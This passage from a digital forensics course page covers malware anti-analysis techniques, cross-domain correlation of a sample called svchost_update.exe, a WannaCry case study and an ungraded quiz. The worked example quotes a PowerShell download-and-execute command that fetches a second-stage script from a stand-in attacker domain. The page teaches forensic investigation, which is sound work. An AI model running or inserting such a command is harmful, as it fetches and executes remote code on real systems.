+<p>Every malware analysis feeds answers to these five investigation questions:</p>
+<div class="table-wrap">
+<table>
+<thead>
+<tr><th>#</th><th>Question</th><th>Analysis Source</th></tr>
+</thead>
+<tbody>
+<tr><td>1</td><td><strong>What does the malware do?</strong> (Capability assessment)</td><td>Static analysis (imports, strings) + dynamic analysis (observed behavior)</td></tr>
+<tr><td>2</td><td><strong>How did it get on the system?</strong> (Initial access vector)</td><td>Email forensics, web logs, download artifacts, USB history</td></tr>
+<tr><td>3</td><td><strong>How does it persist?</strong> (Persistence mechanism)</td><td>Registry Run keys, scheduled tasks, services, cron jobs, systemd units</td></tr>
+<tr><td>4</td><td><strong>What data did it access or exfiltrate?</strong> (Impact assessment)</td><td>Network captures, file access logs, dynamic analysis network monitoring</td></tr>
+<tr><td>5</td><td><strong>How can we detect it on other systems?</strong> (IOCs for enterprise search)</td><td>IOC documentation from Module 13.3 — hashes, domains, IPs, registry keys, mutexes</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3>5.2 Cross-Domain Evidence Correlation Map</h3>
+<p>The diagram below shows how malware analysis connects to every forensic domain covered in this course. Each card represents a prior week's evidence domain and the specific artifacts that correlate with malware findings.</p>
+
+<div class="evidence-map" role="img" aria-label="Cross-domain evidence correlation map showing malware analysis at center connected to six forensic evidence domains">
+<div class="map-center">🔬 Malware Analysis<br><small>Static &bull; Dynamic &bull; IOCs</small></div>
+<div class="map-grid">
+<div class="map-card">
+<span class="card-week">Week 5–6</span>
+<span class="card-title">File Systems &amp; Acquisition</span>
+<span class="card-detail">File hash matching &bull; File carving recovered samples &bull; Timestamp analysis (created/modified) &bull; Magic byte verification</span>
+</div>
+<div class="map-card">
+<span class="card-week">Week 7</span>
+<span class="card-title">Windows Forensics I</span>
+<span class="card-detail">Registry Run keys (persistence) &bull; UserAssist (execution evidence) &bull; ShellBags (folder access) &bull; RecentDocs</span>
+</div>
+<div class="map-card">
+<span class="card-week">Week 8</span>
+<span class="card-title">Windows Forensics II</span>
+<span class="card-detail">Event ID 7045 (service install) &bull; Prefetch (execution proof) &bull; Event ID 4104 (PowerShell logging) &bull; $UsnJrnl (file creation)</span>
+</div>
+<div class="map-card">
+<span class="card-week">Week 9</span>
+<span class="card-title">Linux Forensics</span>
+<span class="card-detail">Cron jobs &bull; systemd units &bull; SUID binaries &bull; bash_history &bull; /var/log/auth.log entries</span>
+</div>
+<div class="map-card">
+<span class="card-week">Week 11</span>
+<span class="card-title">Memory Forensics</span>
+<span class="card-detail">malfind (injected code) &bull; pslist/pstree (process anomalies) &bull; netscan (C2 connections) &bull; cmdline (fileless commands)</span>
+</div>
+<div class="map-card">
+<span class="card-week">Week 12</span>
+<span class="card-title">Network Forensics</span>
+<span class="card-detail">PCAP C2 beaconing &bull; DNS queries to C2 domains &bull; Exfiltration traffic &bull; Web server logs (delivery vector) &bull; Firewall logs</span>
+</div>
+</div>
+</div>
+
+<h3>5.3 Worked Example — Tracing <code>svchost_update.exe</code> Across Evidence Domains</h3>
+<p>Let's trace the week-long <code>svchost_update.exe</code> scenario across every evidence domain to see how cross-domain correlation works in practice.</p>
+
+<div class="table-wrap">
+<table>
+<thead>
+<tr><th>Evidence Domain</th><th>Artifact</th><th>What It Tells Us</th></tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Static Analysis</strong><br>(Module 13.2)</td>
+<td>SHA-256 hash; strings containing <code>evil-update.example.com</code>; imports include <code>RegSetValueEx</code>, <code>InternetOpenUrl</code></td>
+<td>Unique file identifier; C2 domain; capabilities include registry persistence and network communication</td>
+</tr>
+<tr>
+<td><strong>Dynamic Analysis</strong><br>(Module 13.3)</td>
+<td>ProcMon: writes to <code>HKCU\...\Run\WindowsUpdate</code>; Wireshark: DNS query to <code>evil-update.example.com</code>, HTTPS POST to <code>198.51.100.42:443</code></td>
+<td>Confirms persistence mechanism and C2 communication observed in sandbox</td>
+</tr>
+<tr>
+<td><strong>Week 7 — Registry</strong></td>
+<td><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> contains value <code>WindowsUpdate</code> → <code>C:\Users\jsmith\AppData\Local\Temp\svchost_update.exe</code></td>
+<td>Persistence confirmed on victim's actual system — matches dynamic analysis finding</td>
+</tr>
+<tr>
+<td><strong>Week 8 — Event Logs</strong></td>
+<td>Event ID 7045: new service <code>WinUpdateSvc</code> created at 02:47 AM; Prefetch: <code>SVCHOST_UPDATE.EXE-A1B2C3D4.pf</code></td>
+<td>Execution timestamp; service-based persistence (second persistence mechanism)</td>
+</tr>
+<tr>
+<td><strong>Week 8 — PowerShell</strong></td>
+<td>Event ID 4104: <code>IEX (New-Object Net.WebClient).DownloadString('http://evil-update.example.com/stage2.ps1')</code></td>
+<td>Second-stage fileless payload downloaded and executed via PowerShell</td>
+</tr>
+<tr>
+<td><strong>Week 11 — Memory</strong></td>
+<td>Volatility <code>netscan</code>: PID 4892 → ESTABLISHED connection to <code>198.51.100.42:443</code>; <code>malfind</code>: injected code in <code>svchost.exe</code> (PID 4892)</td>
+<td>Active C2 connection confirmed in RAM; injected code confirms process hollowing technique</td>
+</tr>
+<tr>
+<td><strong>Week 12 — Network</strong></td>
+<td>PCAP: periodic HTTPS POST to <code>198.51.100.42</code> every 60 seconds (beaconing); DNS log: 847 queries to <code>evil-update.example.com</code> over 72 hours</td>
+<td>C2 beaconing pattern confirmed in network traffic; DNS logs provide timeline of infection duration</td>
+</tr>
+<tr>
+<td><strong>Week 12 — Web Logs</strong></td>
+<td>Apache access log: <code>203.0.113.50</code> → SQL injection in <code>/search?q=</code> parameter at 02:31 AM → 200 response with large byte count</td>
+<td>Initial access vector: attacker exploited web application vulnerability to upload the dropper</td>
+</tr>
+<tr>
+<td><strong>IOCs Extracted</strong><br>(Module 13.3)</td>
+<td>SHA-256, <code>evil-update.example.com</code>, <code>198.51.100.42</code>, <code>HKCU\...\Run\WindowsUpdate</code>, <code>Global\XYZ123</code> (mutex)</td>
+<td>Searchable across the entire enterprise to identify other compromised systems</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<div class="callout integration">
+<div class="callout-title"><span class="icon">🌐</span> The Power of Correlation</div>
+<p>No single row in the table above proves the full story. But <em>together</em>, they build an airtight investigative narrative: the attacker exploited a web vulnerability (Week 12 web logs) → uploaded malware (Week 5 file carving) → established persistence via registry and service (Weeks 7–8) → communicated with a C2 server (Weeks 11–12 memory and network) → downloaded a fileless second stage (Week 8 PowerShell logging). This is the cross-domain correlation skill that Lab 12 requires and that the Week 17 Final Project rewards.</p>
+</div>
+
+<h3>5.4 Forward Look</h3>
+<div class="callout">
+<div class="callout-title"><span class="icon">🔭</span> Looking Ahead</div>
+<ul>
+<li><strong>Week 16 (Email Forensics and Anti-Forensics):</strong> The anti-analysis techniques you learned in this module — packers, obfuscation, anti-VM, anti-debugging — are a subset of the broader <em>anti-forensics</em> landscape. Week 16 expands this topic to include evidence destruction, timestamp manipulation, log wiping, and steganography.</li>
+<li><strong>Week 17 (Final Project):</strong> Students who choose a malware-focused investigation scenario for the Final Project will rely heavily on the static analysis, dynamic analysis, IOC extraction, and cross-domain correlation skills from Week 13. The worked correlation example above is a model for the kind of multi-domain analysis expected in the final report.</li>
+</ul>
+</div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SECTION 6: CASE STUDY -->
+<!-- ============================================================ -->
+<section id="case-study" aria-labelledby="case-heading">
+<h2 id="case-heading">6. Real-World Case Study — WannaCry and the Power of Strings Analysis</h2>
+
+<h3>6.1 Background</h3>
+<p>In May 2017, the <strong>WannaCry</strong> ransomware worm spread across more than 200,000 systems in 150 countries within hours. It exploited the EternalBlue vulnerability in Windows SMB (Server Message Block) to propagate across networks without user interaction — making it a <em>worm</em> by the classification you learned in Module 13.1.</p>
+
+<h3>6.2 The Kill Switch — Discovered Through Strings Analysis</h3>
+<p>A security researcher (Marcus Hutchins, known as MalwareTech) performed one of the most consequential acts of malware analysis in history — and it started with a technique you learned in Module 13.2.</p>
+
+<div class="callout scenario">
+<div class="callout-title"><span class="icon">💡</span> The Kill Switch Story</div>
+<p>During analysis of a WannaCry sample, researchers extracted strings and discovered a <strong>hardcoded domain name</strong> — a long, seemingly random URL. The malware attempted to connect to this domain before encrypting files. If the connection <em>succeeded</em> (the domain resolved and responded), the malware <strong>exited without encrypting</strong>.</p>
+<p>The domain was unregistered. Hutchins registered it for approximately $10.69, pointed it to a sinkhole server, and — almost accidentally — <strong>activated the kill switch</strong>, halting WannaCry's spread worldwide.</p>
+<p><strong>Why did the malware have a kill switch?</strong> The most widely accepted theory is that it was an <strong>anti-sandbox check</strong>. Many automated sandboxes simulate internet connectivity by responding to <em>all</em> DNS queries with a valid IP. The malware author likely intended the domain check as a sandbox detection mechanism: if this random domain resolves, we must be in a sandbox — do not execute. On a real victim's machine, the unregistered domain would fail to resolve, and the malware would proceed.</p>
+</div>
+
+<h3>6.3 Connecting WannaCry to This Module's Concepts</h3>
+<div class="table-wrap">
+<table>
+<thead>
+<tr><th>Module 13 Concept</th><th>WannaCry Application</th></tr>
+</thead>
+<tbody>
+<tr><td>Strings analysis (Module 13.2)</td><td>The kill switch domain was discovered through basic string extraction</td></tr>
+<tr><td>Anti-analysis / sandbox evasion (this module)</td><td>The kill switch was likely an anti-sandbox mechanism — environment-aware execution</td></tr>
+<tr><td>Network IOCs (Module 13.3)</td><td>The kill switch domain and EternalBlue SMB traffic became critical IOCs</td></tr>
+<tr><td>Worm classification (Module 13.1)</td><td>WannaCry self-propagated via SMB — a worm, not just a trojan</td></tr>
+<tr><td>Cross-domain correlation (this module)</td><td>Analysts correlated network traffic (SMB scanning), memory artifacts (injected payloads), file system changes (encrypted files, ransom notes), and registry persistence</td></tr>
+</tbody>
+</table>
+</div>
+
+<h3>6.4 Reflection Prompt (Ungraded)</h3>
+<div class="callout tip">
+<div class="callout-title"><span class="icon">💬</span> Think About It</div>
+<p>Consider the following questions. You do not need to submit responses, but reflecting on them will deepen your understanding of how anti-analysis techniques interact with real-world forensic investigations.</p>
+<ol>
+<li>The WannaCry kill switch was an anti-sandbox technique that backfired on the malware author. Can you think of a scenario where an anti-analysis technique might <em>help</em> forensic investigators rather than hinder them? (Hint: consider what the presence of anti-VM checks reveals about the malware.)</li>
+<li>If WannaCry had been packed with VMProtect instead of being left with readable strings, the kill switch domain might never have been discovered through static analysis. What alternative analysis technique (covered in Module 13.3) could still have revealed the domain?</li>
+<li>WannaCry spread via the network (SMB). If you were the forensic examiner investigating a WannaCry-infected network, which evidence domains from Weeks 5–12 would you prioritize, and in what order? Why?</li>
+</ol>
+</div>
+
+<div class="callout">
+<div class="callout-title"><span class="icon">📝</span> Instructor Note</div>
+Your instructor may substitute a different case study (such as SolarWinds SUNBURST or NotPetya) depending on current events and class discussion. The analytical framework — connecting malware analysis techniques to real-world outcomes — remains the same regardless of the specific case.
+</div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SECTION 7: KNOWLEDGE CHECK -->
+<!-- ============================================================ -->
+<section id="knowledge-check" aria-labelledby="kc-heading">
+<h2 id="kc-heading">7. Knowledge Check (Ungraded)</h2>
+<p>Test your understanding of this module's key concepts. Select an answer for each question, then click <strong>Check Answer</strong> to see explanatory feedback. These questions are not graded and do not affect your course score.</p>
+
+<!-- Question 1 -->
+<div class="kc-question" id="kc-q1">
+<p class="q-stem">1. During static analysis of a suspicious executable, you observe the following: section entropy of 7.4, section names <code>UPX0</code> and <code>UPX1</code>, and an import table containing only <code>LoadLibraryA</code>, <code>GetProcAddress</code>, and <code>ExitProcess</code>. What is the most likely explanation, and what should your next step be?</p>
+<ul class="kc-options">
+<li><label><input type="radio" name="q1" value="a"> The file is corrupted and cannot be analyzed further. Report it as inconclusive.</label></li>
+<li><label><input type="radio" name="q1" value="b"> The file is packed with UPX. Attempt to unpack it with <code>upx -d</code> and then repeat static analysis on the unpacked binary.</label></li>
+<li><label><input type="radio" name="q1" value="c"> The file is a .NET assembly. Use a .NET decompiler to examine the source code.</label></li>
+<li><label><input type="radio" name="q1" value="d"> The high entropy indicates the file is a compressed archive (ZIP). Rename it with a .zip extension and extract its contents.</label></li>
+</ul>
+<button class="btn" onclick="checkAnswer('q1','b')">Check Answer</button>
+<div class="kc-feedback correct" id="kc-q1-correct">
+<strong>✅ Correct!</strong> All three indicators — high entropy, <code>UPX0</code>/<code>UPX1</code> section names, and a minimal import table — are classic signatures of UPX packing. UPX is open-source and can be trivially unpacked using <code>upx -d packed_file.exe</code>. After unpacking, the real code, strings, and full import table become visible, and you should repeat your complete static analysis workflow (hash generation, string extraction, PE header analysis, import table review) on the unpacked binary.
+</div>
+<div class="kc-feedback incorrect" id="kc-q1-incorrect">
+<strong>❌ Not quite.</strong> The combination of high section entropy, <code>UPX0</code>/<code>UPX1</code> section names, and a minimal import table (only <code>LoadLibraryA</code> and <code>GetProcAddress</code>) are the classic indicators of <strong>UPX packing</strong>. The correct next step is to unpack it with <code>upx -d</code> and then repeat static analysis on the unpacked binary, which will reveal the real code, strings, and full import table.
+</div>
+</div>
+
+<!-- Question 2 -->
+<div class="kc-question" id="kc-q2">
+<p class="q-stem">2. You execute a malware sample in your VMware analysis VM. The process starts, runs for 0.3 seconds, and exits without performing any observable malicious activity. Process Monitor shows it queried the registry key <code>HKLM\SOFTWARE\VMware, Inc.\VMware Tools</code> (result: SUCCESS) immediately before exiting. On the victim's physical workstation, the same sample encrypted hundreds of files. What is the most likely explanation?</p>
+<ul class="kc-options">
+<li><label><input type="radio" name="q2" value="a"> The malware requires internet connectivity to function, and your VM was network-isolated.</label></li>
+<li><label><input type="radio" name="q2" value="b"> The malware detected it was running in a VMware virtual machine via the registry key and exited to avoid analysis.</label></li>
+<li><label><input type="radio" name="q2" value="c"> The malware's C2 server was offline at the time of your analysis, so it could not receive the encryption command.</label></li>
+<li><label><input type="radio" name="q2" value="d"> The malware sample was corrupted during acquisition and did not execute properly.</label></li>
+</ul>
+<button class="btn" onclick="checkAnswer('q2','b')">Check Answer</button>
+<div class="kc-feedback correct" id="kc-q2-correct">
+<strong>✅ Correct!</strong> This is a textbook example of an <strong>anti-VM technique</strong>. The malware queried a VMware-specific registry key, received a SUCCESS result (confirming VMware Tools is installed), and immediately exited. On the victim's physical machine, this check would have failed (no VMware Tools registry key), and the malware would have proceeded with its encryption payload. <strong>Countermeasures:</strong> Remove VMware Tools, delete the associated registry keys, and re-execute. Alternatively, analyze on a bare-metal system. Remember: the presence of anti-VM behavior is itself a forensic finding that documents attacker sophistication.
+</div>
+<div class="kc-feedback incorrect" id="kc-q2-incorrect">
+<strong>❌ Not quite.</strong> The key evidence is the registry query to <code>HKLM\SOFTWARE\VMware, Inc.\VMware Tools</code> returning SUCCESS immediately before the process exited. This is an <strong>anti-VM technique</strong> — the malware detected it was running inside a VMware virtual machine and refused to execute its payload. On the victim's physical workstation, this registry key would not exist, so the check would fail and the malware would proceed with encryption. Countermeasures include removing VMware Tools and its registry entries before re-executing the sample.
+</div>
+</div>
+
+<!-- Question 3 -->
+<div class="kc-question" id="kc-q3">
+<p class="q-stem">3. Your malware analysis of <code>svchost_update.exe</code> identified a C2 IP address of <code>198.51.100.42</code> during dynamic analysis. Which of the following represents the strongest cross-domain correlation of this finding?</p>
+<ul class="kc-options">
+<li><label><input type="radio" name="q3" value="a"> The same IP appears in a VirusTotal report for a different malware family.</label></li>
+<li><label><input type="radio" name="q3" value="b"> The same IP appears in the victim's Volatility <code>netscan</code> output (Week 11) as an ESTABLISHED connection from the suspicious process, AND in the Week 12 PCAP as periodic HTTPS beaconing every 60 seconds to the same address.</label></li>
+<li><label><input type="radio" name="q3" value="c"> The IP address is listed on a public blocklist as associated with malicious activity.</label></li>
+<li><label><input type="radio" name="q3" value="d"> A Google search for the IP address returns results mentioning it in a security blog post about a similar attack.</label></li>
+</ul>
+<button class="btn" onclick="checkAnswer('q3','b')">Check Answer</button>
+<div class="kc-feedback correct" id="kc-q3-correct">
+<strong>✅ Correct!</strong> Cross-domain correlation means finding the <strong>same indicator in multiple independent evidence sources</strong> from your own investigation. Finding <code>198.51.100.42</code> in three independent places — dynamic analysis (sandbox), memory forensics (Volatility <code>netscan</code>), and network forensics (PCAP beaconing) — creates a corroborated chain of evidence that is far stronger than any single source. The other options involve external intelligence sources, which are useful for context but do not constitute cross-domain <em>correlation</em> within your forensic investigation.
+</div>
+<div class="kc-feedback incorrect" id="kc-q3-incorrect">
+<strong>❌ Not quite.</strong> While external threat intelligence (VirusTotal, blocklists, security blogs) provides useful context, <strong>cross-domain correlation</strong> specifically means finding the same indicator across <strong>multiple independent evidence domains within your own investigation</strong>. The strongest answer is finding <code>198.51.100.42</code> confirmed in three places: your sandbox dynamic analysis, the victim's memory dump (Volatility <code>netscan</code> from Week 11), and the network packet capture (PCAP beaconing from Week 12). This three-source corroboration builds the strongest evidentiary foundation.
+</div>
+</div>
+</section>
+
+<!-- ============================================================ -->
+<!-- MODULE SUMMARY -->
+<!-- ============================================================ -->
+<section aria-labelledby="summary-heading">
+<h2 id="summary-heading">Module Summary</h2>
+<p>This module completed the Week 13 malware forensics arc by covering two essential topics:</p>
+
+<h3>Anti-Analysis Techniques</h3>
+<ul>
+<li><strong>Packers</strong> compress or encrypt executables to defeat static analysis. Detection indicators include high entropy, unusual section names, and minimal imports. UPX is trivially unpacked; commercial packers (Themida, VMProtect) require dynamic analysis or memory dumping.</li>
+<li><strong>Obfuscation</strong> hides strings, control flow, and API calls without necessarily packing the entire binary. FLOSS and dynamic analysis are the primary countermeasures.</li>
+<li><strong>Anti-VM techniques</strong> detect virtual machine artifacts (registry keys, process names, MAC addresses, hardware strings, timing discrepancies) and alter behavior to evade sandbox analysis.</li>
+<li><strong>Anti-debugging techniques</strong> detect attached debuggers via API calls (<code>IsDebuggerPresent</code>) and timing checks.</li>
+<li><strong>Other evasion</strong> includes environment checks, delayed execution, geofencing, and fileless techniques that avoid writing to disk entirely.</li>
+<li>The <em>presence</em> of anti-analysis techniques is itself a forensic indicator of malicious intent and attacker sophistication.</li>
+</ul>
+
+<h3>Cross-Domain Integration</h3>
+<ul>
+<li>Malware analysis answers five key investigation questions: capability, initial access, persistence, impact, and detection (IOCs).</li>
+<li>Findings become most powerful when <strong>correlated across evidence domains</strong>: file systems (Weeks 5–6), Windows artifacts (Weeks 7–8), Linux artifacts (Week 9), memory (Week 11), and network (Week 12).</li>
+<li>The worked <code>svchost_update.exe</code> correlation example demonstrated how a single malware sample generates artifacts visible across every domain studied in this course.</li>
+</ul>
+
+<div class="callout tip">
+<div class="callout-title"><span class="icon">📋</span> What's Next</div>
+<ul>
+<li><strong>Lab 12:</strong> Apply everything from Modules 13.1–13.4. You will perform static analysis, dynamic analysis, IOC extraction, identify anti-analysis techniques, and write a cross-domain correlation connecting at least one malware finding to a prior forensic domain.</li>
+<li><strong>Week 14:</strong> Mobile Forensics — the static and dynamic analysis methodology you learned this week transfers directly to mobile malware and app analysis.</li>
+</ul>
+</div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+<p>CSC 156 – Digital Forensics Fundamentals | Mendocino College | Week 13, Module 13.4</p>
+<p>This content is part of the course learning materials and is intended for enrolled students.</p>
+</footer>
+
+</main>
+
+<!-- ============================================================ -->
+<!-- JAVASCRIPT — Accordions + Knowledge Checks -->
+<!-- ============================================================ -->
+<script>
+// --- Accordion Toggle ---
+document.querySelectorAll('.accordion-btn').forEach(function(btn){
+btn.addEventListener('click', function(){
+var expanded = this.getAttribute('aria-expanded') === 'true';
+this.setAttribute('aria-expanded', String(!expanded));
+var panel = document.getElementById(this.getAttribute('aria-controls'));
+if(!expanded){
+panel.style.maxHeight = panel.scrollHeight + 'px';
+} else {
+panel.style.maxHeight = '0';
+}
+});
+btn.addEventListener('keydown', function(e){
+if(e.key === 'Enter' || e.key === ' '){
+e.preventDefault();
+this.click();
+}
+});
+});
+
+// --- Knowledge Check ---
+function checkAnswer(qName, correctValue){
+var radios = document.querySelectorAll('input[name="' + qName + '"]');
+var selected = null;
+radios.forEach(function(r){ if(r.checked) selected = r.value; });
+
+var container = document.getElementById('kc-' + qName);
+var fbCorrect = document.getElementById('kc-' + qName + '-correct');
+var fbIncorrect = document.getElementById('kc-' + qName + '-incorrect');
+
+// Hide both first
+fbCorrect.style.display = 'none';
+fbIncorrect.style.display = 'none';
+
+if(selected === null){
+// No selection — show a prompt
+var existing = container.querySelector('.kc-feedback.neutral');
+if(!existing){
+var note = document.createElement('div');
+note.className = 'kc-feedback neutral';
+note.style.display = 'block';
+note.innerHTML = '<strong>⚠️ Please select an answer before checking.</strong>';
+container.appendChild(note);
+} else {
+existing.style.display = 'block';
+}
+return;
+}
+
+// Remove any neutral prompt
+var neutral = container.querySelector('.kc-feedback.neutral');
+if(neutral) neutral.style.display = 'none';
+
+if(selected === correctValue){
+fbCorrect.style.display = 'block';
+} else {
+fbIncorrect.style.display = 'block';
+}
+
+// Scroll feedback into view
+var visible = (selected === correctValue) ? fbCorrect : fbIncorrect;
+visible.scrollIntoView({behavior:'smooth', block:'nearest'});
+}
+</script>
+
+</body>
+</html>
